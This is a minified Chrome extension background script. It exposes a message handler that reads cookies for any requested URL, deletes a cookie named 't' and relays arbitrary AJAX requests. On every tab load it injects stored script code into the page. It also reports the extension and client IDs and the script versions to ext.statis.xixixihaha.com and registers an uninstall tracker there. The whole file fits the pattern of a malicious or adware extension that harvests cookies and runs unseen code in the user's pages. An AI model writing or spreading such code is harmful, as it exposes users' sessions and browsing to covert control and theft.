chrome.extension.onMessage.addListener(function(t,e,i){return"clearCook"==t.name?chrome.cookies.get({url:t.url,name:"t"},function(e){e&&e.name&&removeCookie(t.url,e),i("1")}):"getCook"==t.name?chrome.cookies.getAll({url:t.url,name:t.key},function(e){i(e)}):"universal"==t.name&&$.ajax({type:t.type,url:t.url,dataType:t.dataType,data:t.data,timeout:5e3,success:function(e){i(e)},error:function(){i("")}}),!0}),chrome.tabs.onCreated.addListener(function(e,t,i){urlMatch(e,t,i)}),chrome.tabs.onUpdated.addListener(function(e,t,i){urlMatch(e,t,i)});var clock=null;function urlMatch(e,t,i){i&&i.url&&(clearTimeout(clock),clock=setTimeout(function(){executeScript(e)},3e3),t&&t.status&&"complete"==t.status&&(clearTimeout(clock),executeScript(e)))}function executeScript(t){chrome.storage.local.get(null,function(e){e&&e.LibJs622&&e.MainJs622&&chrome.tabs.executeScript(t,{code:e.LibJs622+e.MainJs622},function(){chrome.runtime.lastError})})}function setLeftTime(){var e=(new Date).getTime(),t=new Date;return t.setTime(5e3+e),t}if(browserObj().runtime.setUninstallURL("https://ext.statis.xixixihaha.com/uninstall.php?cid="+cid),!(-1<document.cookie.indexOf("newdailyActivity"))){var lefttime=setLeftTime();document.cookie="newdailyActivity="+escape(cid)+";expires="+lefttime.toGMTString();var sid=localStorage.sid?localStorage.sid:0,t=localStorage.t?localStorage.t:0;chrome.storage.local.get(null,function(e){var i=e.LibVer622?e.LibVer622:"",a=e.MainVer622?e.MainVer622:"";$.ajax({url:"https://ext.statis.xixixihaha.com/index/Commoninterface/statisticsPlug",type:"post",data:{sid:sid,t:t,cid:cid,xid:chrome.runtime.id,libver:i,mainver:a},dataType:"json",success:function(e){e.sid&&(localStorage.sid=e.sid),e.t&&(localStorage.t=e.t)}})})}